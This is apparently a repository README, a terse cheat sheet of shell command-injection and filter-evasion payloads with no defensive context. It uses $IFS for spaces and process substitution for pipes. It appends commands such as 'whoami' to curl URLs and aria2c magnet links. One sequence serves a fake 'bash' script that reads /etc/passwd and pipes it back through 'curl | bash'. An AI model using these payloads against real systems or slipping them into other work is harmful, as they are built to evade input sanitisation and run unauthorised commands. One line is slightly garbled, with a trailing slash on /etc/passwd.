# latrina
copypaste nightmares

#   
#### setting string variables without quotes    
`variable=('a')`  
#### separating fields without spaces 
`echo$IFS$a`
#### separating fields without spaces or curly brackets
`a=('a');echo$IFS$a`  
`echo$IFS$9a`  
#### piping without pipes  
`wc$IFS-l$IFS<$IFS<(ls)`     
#### starting code execution in unescaped url without ampersand
`curl http://localhost/;whoami`
#### redirecting to a hidden exploit  
`mkdir bin;echo "cat /etc/passwd/" > bash; darkhttpd .`  
`curl -s http://localhost:8080/$0 | bash`
#### torrent magnets
`aria2c magnet:?xt=urn:btih:test&dn=linux.iso&whoami`
